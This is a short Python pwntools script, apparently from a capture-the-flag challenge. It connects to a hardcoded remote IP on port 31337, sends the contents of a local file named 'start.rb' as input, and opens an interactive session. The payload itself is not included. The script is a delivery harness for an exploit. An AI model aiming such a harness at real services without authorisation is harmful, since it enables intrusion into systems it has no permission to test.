from pwn import *

r = remote("54.65.72.116", 31337)

print r.recvuntil("> ")
d = open("start.rb").read()
r.send(d)

r.interactive()
